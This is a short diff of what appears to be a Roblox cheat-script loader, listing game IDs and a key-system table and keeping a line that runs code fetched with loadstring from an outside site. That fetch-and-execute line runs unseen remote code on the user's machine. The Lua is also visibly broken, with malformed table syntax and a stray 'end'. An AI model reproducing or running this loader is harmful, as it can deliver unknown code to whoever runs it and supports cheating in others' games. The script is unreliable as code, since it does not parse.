@@ -7,11 +7,12 @@ local games = {
     ["Anime Souls Simulator"] = 11542692507,
 }
 
-loadstring(game:HttpGet("https://www.utilityhub.gq/execution.lua"))();
-
-local get keys = {
+local keysystem = {
     ["input key"] "",
 }
+
+loadstring(game:HttpGet("https://www.utilityhub.gq/execution.lua"))();
+
 end
    
 -- Credits: Sand Dog#5240 / ! Sunn#5342
